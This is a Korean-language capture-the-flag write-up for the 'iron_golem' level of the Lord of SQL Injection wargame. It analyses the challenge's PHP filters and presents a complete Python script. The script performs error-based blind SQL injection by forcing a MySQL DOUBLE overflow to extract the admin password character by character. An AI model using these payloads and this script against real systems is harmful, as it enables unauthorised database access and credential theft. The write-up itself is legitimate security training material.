# Lord of SQL Injection No.21 - iron_golem

## 문제 출제 의도

Error based SQL Injection을 할 수 있는지 확인 한다.

## 소스 코드 분석
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```
* preg_match 함수에서 pw의 문자열중 'prob','_','.','()','sleep','benchmark'를 필터링 해낸다.

* 'if(mysql_error()) exit(mysql_error());' 부분에서 error를 찾아 출력해준다.

* 아래 입력한 pw값과 sql에서의 반환된 pw값이 일치할때 문제풀이가 해결되므로 Blind SQL Injection임을 알 수 있다.

## 문제 해결 방안
* benchmark와 sleep이 필터링 되므로 다른 방법으로 오류를 내는 지수 연산 최대치를 이용한다.

### 지수 연산 최대치

MySQL에서 e를 이용한 지수연산이 가능한데 9e10의 경우 9*10의 10승이라는 의미를 가지고 있다.

그런데 MySQL에서는 9e307까지 지수연산을 지원하므로 9e307*2를 하거나 9e308이상을 하면 에러가 발생한다.

9e307*2의 경우 DOUBLE value is out of range 오류가 나며 9e308의 경우 illegal 에러가 발생한다.
-----
* 아래 소스코드를 이용하여 문제를 해결한다.

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
length = 0;
A = 1
while A >0:
    url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw=%"
    add_url = "' or id='admin' and if(length(pw)={},9e307*2,0)-- -".format(str(A))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)

    re.add_header("User-Agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

    res = urllib.request.urlopen(re)
    resA = res.read()
    if str(resA).find("DOUBLE value is out of range") != -1:
        length = A
        print("Length = {}".format(str(A)))
        break
    A=A+1 
    # pw 의 문자열을 구하는 while문이다 pw의 문자열 길이가 몇인지 범위를 모르므로 while문으로 천천히 증가시켜주며 확인하고 찾을시에 break를 해주는 방법으로 풀었다.
    # if문을 이용해서 에러를 발생시키는데 첫번째 인자가 참이면 두번째 인자의 문장을 거짓이면 세번째 인자의 문장을 실행시키는데 이를 이용하여 문자열의 길이를 찾았을 때 에러를 발생시켜 찾았다.
for i in range(1,(int)(A/2)):
    for j in range(32,127):
        url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "' or id='admin' and if(substr(pw,1,{})='{}',9e307*2,0)-- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)
        resB = res.read()
        if str(resB).find("DOUBLE value is out of range") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break
        # error based이므로 해당 문자열이 맞을 경우 에러를 내는 방법을 사용했다.
print("Finished Searching.")
print("Password : " + result)
```
코드를 실행시킬시에 `!!!!    ` 가 출력되고 이를 입력하게되면 문제가 해결된다.